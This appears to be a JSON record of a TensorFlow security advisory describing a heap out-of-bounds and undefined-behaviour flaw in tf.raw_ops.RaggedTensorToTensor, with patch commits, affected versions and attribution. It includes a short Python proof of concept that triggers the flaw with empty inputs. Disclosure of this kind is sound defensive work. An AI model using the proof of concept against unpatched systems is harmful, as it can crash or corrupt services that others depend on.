{"description": "### Impact\nDue to lack of validation in `tf.raw_ops.RaggedTensorToTensor`, an attacker can exploit an undefined behavior if input arguments are empty:\n\n```python\nimport tensorflow as tf\n\nshape = tf.constant([-1, -1], shape=[2], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = tf.constant(404, dtype=tf.int64)\nrow = tf.constant([269, 404, 0, 0, 0, 0, 0], shape=[7], dtype=tf.int64)\nrows = [row]\ntypes = ['ROW_SPLITS']\n\ntf.raw_ops.RaggedTensorToTensor(\n  shape=shape, values=values, default_value=default_value, \n  row_partition_tensors=rows, row_partition_types=types)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/ragged_tensor_to_tensor_op.cc#L356-L360) only checks that one of the tensors is not empty, but does not check for the other ones.\n\nThere are multiple `DCHECK` validations to prevent heap OOB, but these are no-op in release builds, hence they don't prevent anything.\n\n### Patches\nWe have patched the issue in GitHub commit [b761c9b652af2107cfbc33efd19be0ce41daa33e](https://github.com/tensorflow/tensorflow/commit/b761c9b652af2107cfbc33efd19be0ce41daa33e) followed by GitHub commit [f94ef358bb3e91d517446454edff6535bcfe8e4a](https://github.com/tensorflow/tensorflow/commit/f94ef358bb3e91d517446454edff6535bcfe8e4a) and GitHub commit [c4d7afb6a5986b04505aca4466ae1951686c80f6](https://github.com/tensorflow/tensorflow/commit/c4d7afb6a5986b04505aca4466ae1951686c80f6).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick these commits on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Heap OOB", "Null pointer dereference", "Lack of validation in input arguments", "Undefined behavior due to empty input arguments", "Use of `DCHECK` validations that are no-op in release builds"]}
